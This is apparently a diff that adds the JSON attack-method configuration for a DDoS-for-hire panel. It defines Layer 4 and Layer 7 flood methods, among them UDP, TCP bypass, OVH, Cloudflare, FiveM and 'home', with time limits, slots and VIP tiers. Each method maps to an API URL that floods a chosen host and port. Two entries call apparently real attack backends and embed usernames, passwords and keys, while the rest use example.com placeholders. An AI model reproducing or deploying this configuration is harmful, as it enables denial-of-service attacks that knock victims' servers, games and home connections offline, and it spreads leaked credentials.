@@ -1,0 +1,272 @@
+[
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udp",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+     "http://api.canthitme.lol:8080/api/attack?username=xpert1&password=xpertlol&target={HOST}&port={PORT}&time={TIME}&method=udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "discord",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "socket",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "fivem",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "https",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tls",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "game",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+     "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "home",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "dns",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udp-remedy",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udpbypass",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+    "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "ovh",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "ovh-tcp",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tcpbypass",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "handshake",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "http-remedy",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "cloudflare",
+    "group": "LAYER 7",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 30,
+    "maxTime": 1200,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "https://ieatpackets.lol/api/start?user=xpert&key=wallmart66&target={HOST}&port={PORT}&time={TIME}&method=H2-CIKO",
+       "https://ieatpackets.lol/api/start?user=xpert&key=wallmart66&target={HOST}&port={PORT}&time={TIME}&method=H2-FLOOD"    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "hold",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 10,
+    "minTime": 60,
+    "maxTime": 900,
+    "slots": 2,
+    "permission": ["private"],
+    "API": [
+       "https://example.com/api/attack?host={HOST}&port={PORT}&time={TIME}"
+    ]
+  }
+]
